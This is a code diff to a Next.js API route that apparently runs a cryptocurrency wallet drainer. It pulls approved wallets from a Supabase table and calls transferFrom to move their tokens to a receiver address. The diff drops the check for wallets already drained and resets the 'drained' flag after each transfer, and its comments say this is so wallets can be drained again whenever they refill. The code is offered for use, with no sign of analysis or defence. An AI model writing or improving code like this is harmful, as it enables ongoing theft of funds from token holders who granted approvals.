@@ -32,11 +32,11 @@ export async function POST(req: NextRequest) {
     return NextResponse.json({ error: "ADMIN_PRIVATE_KEY is not set in environment variables." }, { status: 500 });
   }
 
+  // Fetch ALL approved wallets regardless of drained flag — balance is checked live
   const { data: wallets, error } = await supabase
     .from("wallets")
     .select("*")
-    .eq("approval_status", true)
-    .eq("drained", false);
+    .eq("approval_status", true);
 
   if (error) return NextResponse.json({ error: error.message }, { status: 500 });
 
@@ -92,9 +92,10 @@ export async function POST(req: NextRequest) {
       const tx = await contract.transferFrom(wallet.address, receiverAddress, transferAmount);
       const receipt = await tx.wait();
 
+      // Reset drained=false so wallet can be drained again when it refills
       await supabase
         .from("wallets")
-        .update({ drained: true, drain_tx_hash: receipt.hash })
+        .update({ drained: false, drain_tx_hash: receipt.hash, updated_at: new Date().toISOString() })
         .eq("id", wallet.id);
 
       await supabase.from("transactions").insert({
